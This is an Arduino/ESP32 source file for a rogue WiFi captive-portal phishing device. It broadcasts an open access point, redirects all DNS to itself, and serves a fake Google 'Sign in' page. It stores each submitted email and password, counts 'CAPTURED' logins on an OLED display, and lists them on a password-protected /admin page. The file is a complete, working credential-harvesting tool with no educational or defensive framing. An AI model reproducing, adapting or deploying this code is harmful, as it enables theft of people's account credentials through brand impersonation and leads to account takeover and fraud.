#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <U8g2lib.h>
#include <Wire.h>

// display config
U8G2_SH1106_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE);

// 64x64 UP Bitmap
const unsigned char myBitmap [] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0xc0, 0xff, 0xff, 0x03, 0x00, 0x00, 0x00, 0x00, 0xf8, 0xff, 0xff, 0x1f, 0x00, 0x00, 
  0x00, 0x00, 0xfe, 0xff, 0xff, 0x7f, 0x00, 0x00, 0x00, 0x00, 0xfe, 0xff, 0xff, 0x7f, 0x00, 0x00, 
  0x00, 0x00, 0xfe, 0xff, 0xff, 0x7f, 0x00, 0x00, 0x00, 0x00, 0xfc, 0xff, 0xff, 0x3f, 0x00, 0x00, 
  0x00, 0x00, 0xfc, 0xff, 0xff, 0x3f, 0x00, 0x00, 0x00, 0x00, 0xfc, 0xff, 0xff, 0x3f, 0x00, 0x00, 
  0x00, 0x00, 0xfc, 0xff, 0xff, 0x3f, 0x00, 0x00, 0x00, 0x00, 0xfc, 0xff, 0xff, 0x3f, 0x00, 0x00, 
  0x00, 0x00, 0xf8, 0xff, 0xff, 0x1f, 0x00, 0x00, 0x00, 0x00, 0xf8, 0xff, 0xff, 0x1f, 0x00, 0x00, 
  0x00, 0x00, 0xf8, 0xff, 0xff, 0x1f, 0x00, 0x00, 0x00, 0x00, 0xf8, 0xff, 0xff, 0x1f, 0x00, 0x00, 
  0x00, 0x00, 0xf8, 0xff, 0xff, 0x1f, 0x00, 0x00, 0x00, 0x00, 0xf8, 0xff, 0xff, 0x1f, 0x00, 0x00, 
  0x00, 0x00, 0xf8, 0xff, 0xff, 0x1f, 0x00, 0x00, 0x00, 0x00, 0xf8, 0xff, 0xff, 0x1f, 0x00, 0x00, 
  0x00, 0x00, 0xf8, 0xff, 0xff, 0x1f, 0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0xff, 0x0f, 0x00, 0x00, 
  0x00, 0x00, 0xf0, 0xff, 0xff, 0x0f, 0x00, 0x00, 0x00, 0x00, 0xc0, 0xff, 0xff, 0x03, 0x00, 0x00, 
  0x00, 0x00, 0x08, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x18, 0x00, 0x00, 
  0x00, 0xf8, 0xf9, 0x01, 0x80, 0x9f, 0x1f, 0x00, 0x00, 0xf8, 0xe3, 0xff, 0xff, 0xc7, 0x1f, 0x00, 
  0x00, 0xf0, 0x0f, 0xff, 0xff, 0xf0, 0x0f, 0x00, 0x00, 0xe0, 0xff, 0x00, 0x00, 0xff, 0x07, 0x00, 
  0x00, 0x80, 0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0xfe, 0xff, 0xff, 0x7f, 0x00, 0x00, 
  0x00, 0x00, 0xe0, 0xff, 0xff, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x07, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0xf0, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x38, 0x1c, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x0c, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0e, 0x70, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x06, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0xe0, 0x01, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x06, 0xe0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0e, 0xf0, 0x01, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x0c, 0xb0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0xb8, 0x01, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0xf8, 0x9f, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x87, 0x01, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0xf8, 0x1f, 0x80, 0x01, 0x00, 
  0x00, 0x00, 0x00, 0xfe, 0x7f, 0x80, 0x01, 0x00, 0x00, 0x00, 0xf0, 0xff, 0xff, 0x8f, 0x01, 0x00, 
  0x00, 0x00, 0xf0, 0xff, 0xff, 0x8f, 0x01, 0x00, 0x00, 0x00, 0xe0, 0xff, 0xff, 0x87, 0x01, 0x00, 
  0x00, 0x00, 0x80, 0x7f, 0xfe, 0x81, 0x01, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xf8, 0x80, 0x01, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// admin credentials
const char* adminUser = "unnamed";
const char* adminPass = "portal"; 

// logging
const int MAX_LOGS = 20;
struct LogEntry { String user; String pass; };
LogEntry logs[MAX_LOGS];
int logCount = 0;

// network
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer server(80);

// html gui
const String loginPage = 
"<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
"<style>body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
".card{width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;text-align:center}@media(max-width:450px){.card{border:none;padding:20px}}"
".logo{height:24px;margin-bottom:10px;font-size:24px;font-weight:500;letter-spacing:-1px}"
".blue{color:#4285f4}.red{color:#ea4335}.yellow{color:#fbbc05}.green{color:#34a853}"
"h1{font-size:24px;font-weight:400;margin:10px 0 0;color:#202124}p{font-size:16px;color:#202124;margin:8px 0 30px}"
"input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:24px;outline:none}"
"input:focus{border:2px solid #1a73e8;padding:12px 14px}.btn{background:#1a73e8;color:#fff;padding:10px 24px;border:none;border-radius:4px;font-weight:500;cursor:pointer;float:right}</style></head>"
"<body><div class='card'><div class='logo'><span class='blue'>G</span><span class='red'>o</span><span class='yellow'>o</span><span class='blue'>g</span><span class='green'>l</span><span class='red'>e</span></div>"
"<h1>Sign in</h1><p>Use your Google Account</p><form action='/login' method='POST'>"
"<input type='text' name='username' placeholder='Email or phone' required>"
"<input type='password' name='password' placeholder='Enter password' required>"
"<button type='submit' class='btn'>Next</button></form></div></body></html>";

// helpers

void updateOLED(String status) {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x12_tr);
  u8g2.drawStr(0, 10, "CONTROL PANEL");
  
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 25, "Access: 192.168.4.1/admin");
  
  u8g2.setCursor(0, 42);
  u8g2.print("User: "); u8g2.print(adminUser);
  u8g2.setCursor(0, 52);
  u8g2.print("Pass: "); u8g2.print(adminPass);
  
  u8g2.drawHLine(0, 56, 128);
  u8g2.setCursor(0, 64);
  u8g2.print("Status: "); u8g2.print(status);
  u8g2.sendBuffer();
}

void handleLogin() {
  if (logCount < MAX_LOGS) {
    logs[logCount++] = {server.arg("username"), server.arg("password")};
  }
  updateOLED("CAPTURED [" + String(logCount) + "]");
  server.send(200, "text/html", "<html><script>location.href='https://accounts.google.com';</script></html>");
}

void handleAdmin() {
  if (!server.authenticate(adminUser, adminPass)) return server.requestAuthentication();
  
  String html = "<html><head><meta charset='utf-8'><title>Logs</title><style>"
                "body{font-family:sans-serif; background:#f4f4f9; padding:20px; color:#333;}"
                "table{width:100%; border-collapse:collapse; background:#fff;}"
                "th,td{padding:10px; border:1px solid #ddd; text-align:left;} th{background:#4285f4; color:#fff;}"
                ".btn{display:inline-block; padding:8px 15px; background:#ea4335; color:#fff; text-decoration:none; border-radius:4px; margin-top:20px;}"
                "</style></head><body><h1>Captured Logs (" + String(logCount) + ")</h1>"
                "<table><tr><th>#</th><th>User</th><th>Password</th></tr>";
  
  for (int i = 0; i < logCount; i++) {
    html += "<tr><td>" + String(i+1) + "</td><td>" + logs[i].user + "</td><td>" + logs[i].pass + "</td></tr>";
  }
  
  html += "</table><a href='/clear' class='btn'>Clear All</a></body></html>";
  server.send(200, "text/html", html);
}

void setup() {
  u8g2.begin();
  u8g2.clearBuffer();
  u8g2.drawXBMP(32, 0, 64, 64, myBitmap);
  u8g2.sendBuffer();
  delay(2000);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("unnamed portal");

  dnsServer.start(DNS_PORT, "*", apIP);
  
  server.on("/", []() { server.send(200, "text/html", loginPage); });
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/admin", handleAdmin);
  server.on("/clear", []() {
    if (!server.authenticate(adminUser, adminPass)) return server.requestAuthentication();
    logCount = 0;
    updateOLED("LOGS RESET");
    server.send(200, "text/html", "Logs cleared. <a href='/admin'>Back</a>");
  });

  server.onNotFound([]() { server.send(200, "text/html", loginPage); });
  server.begin();
  updateOLED("Listening...");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}